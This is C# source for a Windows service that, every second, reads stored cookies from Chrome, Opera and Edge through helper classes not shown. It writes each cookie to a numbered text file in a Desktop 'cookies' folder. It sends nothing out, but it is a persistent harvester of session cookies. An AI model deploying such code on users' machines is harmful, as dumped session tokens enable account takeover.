using Dapper;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;

namespace Cookies_Service
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
            this.CanStop = true;
            this.CanShutdown = true;
            this.CanPauseAndContinue = true;
            this.AutoLog = true;
        }

        protected override void OnStart(string[] args)
        {
            Timer timer = new Timer();
            timer.Interval = 1000;
            timer.AutoReset = true;
            timer.Elapsed += Timer_Elapsed;
            timer.Start();
        }

        private void Timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            try
            {
                //_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-



                if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\cookies"))
                {
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\cookies");
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\cookies\\Chrome");
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\cookies\\Opera");
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\cookies\\Edge");
                }
                if(!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\cookies\\Chrome")){
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\cookies\\Chrome");
                }
                if(!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\cookies\\Opera")){
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\cookies\\Opera");
                }
                if(!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\cookies\\Edge")){
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\cookies\\Edge");
                }


                //_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-


                Chrome_Cookies chrome_cookies = new Chrome_Cookies();
                List<Chrome_Cookies> chrome_collection = chrome_cookies.Load<Chrome_Cookies>(chrome_cookies.Path);

                foreach (Chrome_Cookies item in chrome_collection)
                {
                    File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + $"\\cookies\\Chrome\\{chrome_collection.IndexOf(item)}.txt", item.ToString());
                }


                //_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-


                Opera_Cookies opera_cookies = new Opera_Cookies();
                List<Opera_Cookies> opera_collection = opera_cookies.Load<Opera_Cookies>(opera_cookies.Path);

                foreach (Opera_Cookies item in opera_collection)
                {
                    File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + $"\\cookies\\Opera\\{opera_collection.IndexOf(item)}.txt", item.ToString());
                }


                //_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-


                Edge_Cookies edge_cookies = new Edge_Cookies();
                List<Edge_Cookies> edge_collection = edge_cookies.Load<Edge_Cookies>(edge_cookies.Path);

                foreach (Edge_Cookies item in edge_collection)
                {
                    if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + $"\\cookies\\Edge\\{edge_collection.IndexOf(item)}.txt"))
                    {
                        File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + $"\\cookies\\Edge\\{edge_collection.IndexOf(item)}.txt");
                    }
                    File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + $"\\cookies\\Edge\\{edge_collection.IndexOf(item)}.txt", item.ToString());
                }


                //_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
            }
            catch (Exception ex)
            {
                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\EXCEPTION.txt", "Exception: " + ex.Message + "\r\nException Path: " + ex.StackTrace);
            }
        }

        protected override void OnStop()
        {
        }
    }
}
